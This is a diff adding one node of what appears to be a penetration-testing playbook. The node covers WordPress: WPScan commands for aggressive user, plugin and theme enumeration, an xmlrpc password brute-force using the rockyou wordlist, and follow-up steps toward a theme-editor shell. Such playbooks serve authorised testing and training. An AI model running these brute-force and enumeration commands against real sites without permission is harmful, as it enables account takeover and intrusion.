@@ -1,0 +1,22 @@
+{
+  "id": "wordpress",
+  "phase": "WEB",
+  "title": "WordPress",
+  "body": "Run WPScan hard. Vulnerable plugins are the most reliable attack vector. Enumerate users, all plugins, all themes.",
+  "cmd": "# Full aggressive scan (free API token available at wpscan.com)\nwpscan --url http://$ip \\\n  --enumerate u,ap,at \\\n  --plugins-detection aggressive \\\n  --api-token <TOKEN>\n\n# Brute force once you have usernames\nwpscan --url http://$ip -U admin,editor \\\n  -P /usr/share/wordlists/rockyou.txt \\\n  --password-attack xmlrpc-multicall",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got admin creds — shell via theme editor",
+      "next": "wp_shell"
+    },
+    {
+      "label": "Found vulnerable plugin — searchsploit it",
+      "next": "searchsploit_web"
+    },
+    {
+      "label": "No creds yet — keep enumerating",
+      "next": "web_fuzz_deep"
+    }
+  ]
+}
